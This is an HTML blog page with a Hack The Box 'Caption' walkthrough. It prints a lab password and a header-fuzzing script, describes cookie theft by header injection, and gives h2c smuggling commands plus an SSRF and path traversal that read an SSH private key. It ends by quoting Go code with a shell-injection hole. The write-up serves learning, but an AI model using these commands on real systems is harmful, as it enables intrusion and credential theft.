@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="Table of Contents Enumeration with Nmap Bypassing the &#x2F;logs Directory foothold  Privilege Escalation  In this walkthrough, we’ll explore the steps to compromise the Caption machineon Hack The Box">
+<meta property="og:type" content="article">
+<meta property="og:title" content="caption">
+<meta property="og:url" content="http://nutzh.top/caption/">
+<meta property="og:site_name" content="NUTZH">
+<meta property="og:description" content="Table of Contents Enumeration with Nmap Bypassing the &#x2F;logs Directory foothold  Privilege Escalation  In this walkthrough, we’ll explore the steps to compromise the Caption machineon Hack The Box">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://nutzh.top/img/404.jpg">
+<meta property="og:image" content="http://nutzh.top/img/404.jpg">
+<meta property="article:published_time" content="2025-01-17T22:13:40.000Z">
+<meta property="article:modified_time" content="2025-01-18T03:49:08.090Z">
+<meta property="article:author" content="NUTZH">
+<meta property="article:tag" content="HACK THE BOX">
+<meta property="article:tag" content="WINDOWS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PENETRATION TESTING">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://nutzh.top/img/404.jpg">
+
+    <meta name="keywords" content="CTF , HACKTHEBOX , ACTIVE MACHINE , HARD">
+
+
+<title >caption</title>
+
+<!-- Favicon -->
+
+    <link href='/favico.png?v=2.2.4' rel='icon' type='image/png' sizes='16x16' ></link>
+
+
+    <link href='/favico.png?v=2.2.4' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+    <link href='/apple-touch-icon.png?v=2.2.4' rel='apple-touch-icon' sizes='180x180' ></link>
+
+
+    <link href='/site.webmanifest' rel='manifest' ></link>
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"nutzh.top","author":"NUTZH","root":"/","typed_text":["Cybersecurity Student"],"theme_version":"2.2.4","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":"favico.png","icon16":"favico.png","icon32":"favico.png","apple_touch_icon":"apple-touch-icon.png","webmanifest":"/site.webmanifest","visibilitychange":true,"hidden":"favico.png","show_text":"(/≧▽≦/)","hide_text":"(●—●)"},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms","author":"Post author: ","copyright_link":"Post link: ","copyright_license_title":"Copyright Notice: ","copyright_license_content":"All articles in this blog are licensed under undefined unless otherwise stated.","copy_success":"Copied","copy_failure":"Copy failed","open_read_mode":"Enter reading mode","exit_read_mode":"Exit reading mode","notice_outdate_message":"It has been undefined days since the last update, the content of the article may be outdated.","sticky":"TOP","just":"Just","min":"minutes ago","hour":"hours ago","day":"days ago","month":"months ago"},"swup":false,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"mac","height_limit":false},"toc":{"post_title":true},"live_time":{"start_time":"","prefix":"The blog has been lovely to run undefined day"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2025-01-18 04:49:08"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.4" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+
+     
+
+    
+        <!-- Google Analytics -->
+        <script async src='https://www.googletagmanager.com/gtag/js?id=G-77TF3MK6G4'></script>
+        <script defer>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-77TF3MK6G4');
+        </script>
+    
+
+    
+ 
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="NUTZH" type="application/atom+xml">
+</head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+        <img alt="logo" src="/favico.png">
+    
+    
+        <div class="trm-logo-text">
+            NUTZH<span>NOTE</span>
+        </div>
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    home
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    TimeLine
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a data-no-swup href="/projects/" target="">
+                    projects
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/about/" target="">
+                    about
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="https://images.squarespace-cdn.com/content/v1/5fe4caeadae61a2f19719512/e29e6a85-ed60-408c-806b-622a99c34c35/Screenshot+%281730%29.jpg">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            CAPTION
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            caption
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        caption
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="https://image.cdn2.seaart.me/2023-07-22/47696317661253/37482c38198763e17698578f71a61a0f0f151ae5_high.webp">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        NUTZH
+    </h5>
+    
+        <div class="trm-label">
+            I`m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/0xDEZZNUTZ" title="github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="https://www.linkedin.com/in/youssef-k-ab87061ba/" title="linkdin" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-linkedin"></i>
+        </a>
+    
+        <a href="https://www.instagram.com/deez.nutz_lh/" title="instagram" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-instagram"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                whoami:
+            </div>
+            <div class="trm-label trm-label-light">
+                YOUSSEF.K
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                age:
+            </div>
+            <div class="trm-label trm-label-light">
+                20
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                address:
+            </div>
+            <div class="trm-label trm-label-light">
+                earth
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:0xnutzh@gmail.com" class="trm-btn" style="
+            background: linear-gradient(135deg, #6e8efb, #4a6cf7);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        ">
+            E-mail me
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+
+
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            01/17
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            23:13
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            NUTZH
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h2 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h2><ol>
+<li><a href="#enumeration-with-nmap">Enumeration with Nmap</a></li>
+<li><a href="#bypassing-the-logs-directory">Bypassing the &#x2F;logs Directory</a></li>
+<li><a href="#step-4-foothold">foothold </a></li>
+<li><a href="#step-5-privilege-escalation">Privilege Escalation</a></li>
+</ol>
+<p>In this walkthrough, we’ll explore the steps to compromise the Caption machine<br>on Hack The Box. We’ll cover enumeration, vulnerability discovery,<br>exploitation, and privilege escalation. Let’s dive in!</p>
+<h2 id="Enumeration-with-Nmap"><a href="#Enumeration-with-Nmap" class="headerlink" title="Enumeration with Nmap"></a>Enumeration with Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV  10.10.11.33 -T5           </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 03:28 +01</span><br><span class="line">Nmap scan report <span class="keyword">for</span> caption.htb (10.10.11.33)</span><br><span class="line">Host is up (1.3s latency).</span><br><span class="line">Not shown: 905 closed tcp ports (reset), 92 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http       Werkzeug/3.0.1 Python/3.10.12</span><br><span class="line">8080/tcp open  http-proxy</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>Port 22: OpenSSH 8.9p1 (Ubuntu)</p>
+</li>
+<li><p>Port 80: HTTP server running Werkzeug (Python-based)</p>
+</li>
+<li><p>Port 8080: HTTP proxy service (GitBucket)</p>
+</li>
+</ul>
+<p>the port 8080 is for GitBucket<br>GitBucket is a GitHub-like service. Accessing it reveals two repositories. After<br>some exploration, we find credentials for the user margo.</p>
+<p><img src="/../images/Gitbucket.png" alt="GitBucket"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'> </p>
+<ul>
+<li><p>Username: margo</p>
+</li>
+<li><p>Password: vFr&amp;cS2#0!</p>
+</li>
+</ul>
+<p>With margo’s credentials, we log into the web application hosted on port 80.<br>We notice that the &#x2F;logs endpoint returns a 403 Forbidden error. Inspecting<br>the page with F12 (Developer Tools), we identify a potential vulnerability in<br>the request headers.</p>
+<h3 id="Vulnerability-Discovery"><a href="#Vulnerability-Discovery" class="headerlink" title="Vulnerability Discovery:"></a>Vulnerability Discovery:</h3><p>We use a Python script to automate requests with various headers to identify<br>the vulnerable one:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="comment"># Target URL</span></span><br><span class="line">url = <span class="string">&quot;http://caption.htb/firewalls&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Session cookie</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;session&quot;</span>: <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1hcmdvIiwiZXhwIjoxNzM3MTcyNDE3fQ.xZLwCzFgHMCqV4i4U6Z1PACHCptLtJzq_GZhwDuUsI8&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># List of headers to test</span></span><br><span class="line">headers_list = [</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Proto&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Real-IP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Host&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Custom-Header&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Rewrite-URL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Original-URL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-HTTP-Method-Override&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Port&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Scheme&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Server&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-By&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Prefix&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-Protocol&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Forwarded-SSL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;X-Url-Scheme&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Via&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cache-Control&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Arbitrary value to test</span></span><br><span class="line">test_value = <span class="string">&quot;TestValue123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Function to clear the cache</span></span><br><span class="line">def clear_cache():</span><br><span class="line">    os.system(<span class="string">&quot;curl caption.htb -X XCGFULLBAN &gt; /dev/null 2&gt;&amp;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test each header</span></span><br><span class="line"><span class="keyword">for</span> header <span class="keyword">in</span> headers_list:</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;Testing header: &#123;header&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Clear the cache before each request</span></span><br><span class="line">    clear_cache()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Send the request with the header</span></span><br><span class="line">    response = requests.get(url, cookies=cookies, headers=&#123;header: test_value&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check if the test value is reflected in the response</span></span><br><span class="line">    <span class="keyword">if</span> test_value <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;[+] Vulnerable Header Found: &#123;header&#125;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(f<span class="string">&quot;[-] Not Vulnerable: &#123;header&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>Clear Cache: Before each request, clear the cache using:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl caption.htb -X XCGFULLBAN <span class="comment">#do it in every request u did </span></span><br></pre></td></tr></table></figure>
+
+<p> Use Burp Suite to inject a script into the X-Forwarded-Host header to steal the admin’s cookie.<br><img src="/../images/burpsuite.png" alt="burpsuite"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p> Run a Python HTTP server to capture the admin’s cookie:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server </span><br></pre></td></tr></table></figure>
+<h2 id="Bypassing-the-logs-Directory"><a href="#Bypassing-the-logs-Directory" class="headerlink" title="Bypassing the &#x2F;logs Directory"></a>Bypassing the &#x2F;logs Directory</h2><p>With the admin’s cookie, we use h2csmuggler to bypass the &#x2F;logs directory’s<br>403 Forbidden restriction.<br>Create a Tunnel:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3 h2csmuggler.py -x http://caption.htb/firewalls --<span class="built_in">test</span></span><br><span class="line">[INFO] h2c stream established successfully.</span><br><span class="line">[INFO] Success! http://caption.htb/firewalls can be used <span class="keyword">for</span> tunneling</span><br></pre></td></tr></table></figure>
+<p>Access Restricted Content:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 h2csmuggler.py -x http://caption.htb/firewalls <span class="string">&quot;http://caption.htb/logs&quot;</span> -H <span class="string">&quot;Cookie : [admin&#x27;s Cookie]&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">output</span><br></pre></td></tr></table></figure>
+<p>In the output, we find a local service running on port 3932.<br><strong><a target="_blank" rel="noopener" href="http://localhost:3932/">http://localhost:3932/</a></strong> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 h2csmuggler.py -x http://caption.htb/firewalls <span class="string">&quot;http://caption.htb/download?url=http://127.0.0.1:3923/&quot;</span> -H <span class="string">&quot;Cookie: session=[admin&#x27;s cookie]&quot;</span></span><br></pre></td></tr></table></figure>
+<h2 id="foothhold"><a href="#foothhold" class="headerlink" title="foothhold"></a>foothhold</h2><p>The local service on port 3932 is identified as Copyparty, vulnerable to<br>directory traversal (CVE-2023-51636). We exploit this to read sensitive<br>files, including id_ecdsa (an ECDSA private key for SSH authentication).<br>Unlike id_rsa, which uses RSA encryption, id_ecdsa utilizes the Elliptic<br>Curve Digital Signature Algorithm (ECDSA), offering stronger security<br>with shorter key lengths and greater efficiency in certain contexts.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 h2csmuggler.py -x http://caption.htb/firewalls <span class="string">&quot;http://caption.htb/download?url=http://localhost:3923/.cpr/%252fhome%252fmargo%252f.ssh%252fid_ecdsa&quot;</span> -H <span class="string">&quot;Cookie: session=[admin Cookie]&quot;</span></span><br><span class="line"></span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy</span><br><span class="line">LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQTGOXexsvvDi6ef34AqJrlsOKP3cynseip0tX/R+A58</span><br><span class="line">9sSkErzUOEOJba7G1Ep2TawTJTbWb2KROYrOYLA0zysQAAAAoJxnaNicZ2jYAAAAE2VjZHNhLXNo</span><br><span class="line">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span><br><span class="line">XXXXXXXXXXXXXXX</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p>Using the retrieved private key, we log into the machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh margo@caption.htb -i id_ecdsa</span><br><span class="line"></span><br><span class="line">margo@caption:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>we have gained initial access to a system as the user margo. Through<br>enumeration, we discovered a service running on port 9090 that is vulnerable<br>to command injection. This service is part of a Go application (server.go)<br>found in the GitBucket repository. The vulnerability lies in the way the<br>service processes user input, allowing us to inject arbitrary commands.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">margo@caption:~$ ss -nltp</span><br><span class="line">State      Recv-Q     Send-Q         Local Address:Port         Peer Address:Port     Process                                </span><br><span class="line">LISTEN     0          4096               127.0.0.1:9090              0.0.0.0:*                                               </span><br><span class="line">LISTEN     0          50                   0.0.0.0:8080              0.0.0.0:*         <span class="built_in">users</span>:((&quot;java&quot;,pid=<span class="number">1308</span>,fd=<span class="number">5</span>))        </span><br><span class="line">LISTEN     0          4096           127.0.0.53%lo:53                0.0.0.0:*                                               </span><br><span class="line">LISTEN     0          1024               127.0.0.1:6081              0.0.0.0:*                                               </span><br><span class="line">LISTEN     0          10                 127.0.0.1:6082              0.0.0.0:*                                               </span><br><span class="line">LISTEN     0          1024               127.0.0.1:3923              0.0.0.0:*         <span class="built_in">users</span>:((&quot;python3&quot;,pid=<span class="number">1309</span>,fd=<span class="number">3</span>))     </span><br><span class="line">LISTEN     0          128                127.0.0.1:8000              0.0.0.0:*         <span class="built_in">users</span>:((&quot;python3&quot;,pid=<span class="number">1314</span>,fd=<span class="number">3</span>))     </span><br><span class="line">LISTEN     0          128                  0.0.0.0:22                0.0.0.0:*                                               </span><br><span class="line">LISTEN     0          4096                 0.0.0.0:80                0.0.0.0:*                                               </span><br><span class="line">LISTEN     0          128                     [::]:22                   [::]:* </span><br></pre></td></tr></table></figure>
+<h3 id="Vulnerability-Discovery-1"><a href="#Vulnerability-Discovery-1" class="headerlink" title="Vulnerability Discovery:"></a>Vulnerability Discovery:</h3><p>The service on port 9090 is a Thrift service that processes log files. The<br>vulnerability is in the server.go file, where the service constructs a shell<br>command using user-controlled input without proper sanitization:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    &#125;</span><br><span class="line">    timestamp := time.Now().Format(time.RFC3339)</span><br><span class="line">    logs := fmt.Sprintf(<span class="string">&quot;echo &#x27;IP Address: %s, User-Agent: %s, Timestamp: %s&#x27; &gt;&gt; output.log&quot;</span>, ip, userAgent, timestamp)</span><br><span class="line">    exec.Command&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, logs&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Here, the userAgent variable is directly interpolated into a shell command,<br>which is then executed. This allows us to inject arbitrary commands by<br>crafting a malicious userAgent string.To exploit this vulnerability, we need<br>to craft a payload that will be executed when the service processes our input.</p>
